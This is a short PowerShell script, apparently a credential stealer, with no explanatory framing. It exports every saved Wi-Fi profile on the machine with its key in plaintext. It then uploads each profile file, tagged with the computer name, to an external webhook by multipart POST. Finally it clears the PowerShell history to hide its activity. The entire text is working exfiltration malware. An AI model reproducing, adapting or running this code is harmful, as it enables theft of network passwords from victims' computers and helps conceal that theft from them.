# Export directory
$exportDir = "$env:temp\SomeStuff"

# Ensure that the export directory exists
if (-not (Test-Path $exportDir)) {
    try {
        New-Item -ItemType Directory -Path $exportDir -Force
    } catch {
        Write-Host "Error while creating the export directory: $_"
        return
    }
}

# Export Wi-Fi profiles (including keys)
try {
    netsh wlan export profile key=clear folder=$exportDir
} catch {
    Write-Host "Error while exporting Wi-Fi profiles: $_"
    return
}

# Read all exported XML files
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
if ($xmlFiles.Count -eq 0) {
    Write-Host "No exported Wi-Fi profiles found."
    return
}

# Webhook request with file upload
foreach ($xmlFile in $xmlFiles) {
    $fileContent = Get-Content -Path $xmlFile.FullName -Raw

    # Prepare the data
    $formData = @{
        "username" = "$env:COMPUTERNAME"
        "content"  = "Here is the Wi-Fi profile: $($xmlFile.Name)"
    }

    $formDataFiles = @{
        "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
    }

    # Set header for multipart/form-data
    $boundary = [System.Guid]::NewGuid().ToString()
    $contentType = "multipart/form-data; boundary=$boundary"
    $body = ""

    # Add the data
    foreach ($key in $formData.Keys) {
        $body += "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
        $body += "`r`n"
        $body += "$($formData[$key])`r`n"
    }

    # Add the file
    $body += "--$boundary`r`n"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
    $body += "Content-Type: application/octet-stream`r`n"
    $body += "`r`n"
    $body += [System.IO.File]::ReadAllText($formDataFiles['file'].FullName)
    $body += "`r`n"
    $body += "--$boundary--`r`n"

    # Convert the body into byte data
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Send the request
    try {
        $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
            "Content-Type" = $contentType
        }
        Write-Host "Successfully sent to the webhook: $($xmlFile.Name)"
    } catch {
        Write-Host "Error while sending to the webhook: $_"
    }
}

Clear-History
